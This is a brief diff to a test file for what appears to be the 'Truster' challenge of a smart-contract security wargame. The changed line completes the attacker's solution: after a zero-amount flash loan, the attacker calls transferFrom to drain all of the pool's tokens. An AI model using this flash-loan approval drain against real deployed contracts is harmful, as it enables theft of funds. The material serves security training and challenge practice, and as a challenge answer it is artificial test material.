@@ -39,7 +39,7 @@ describe('[Challenge] Truster', function () {
 
         //await this.token.approve(attacker.address, TOKENS_IN_POOL.toString())
         await this.pool.flashLoan(0, attacker.address, this.token.address, data)
-        await this.token.transferFrom(this.pool.address, attacker.address, 1);
+        await this.token.connect(attacker).transferFrom(this.pool.address, attacker.address, TOKENS_IN_POOL);
     });
 
     after(async function () {
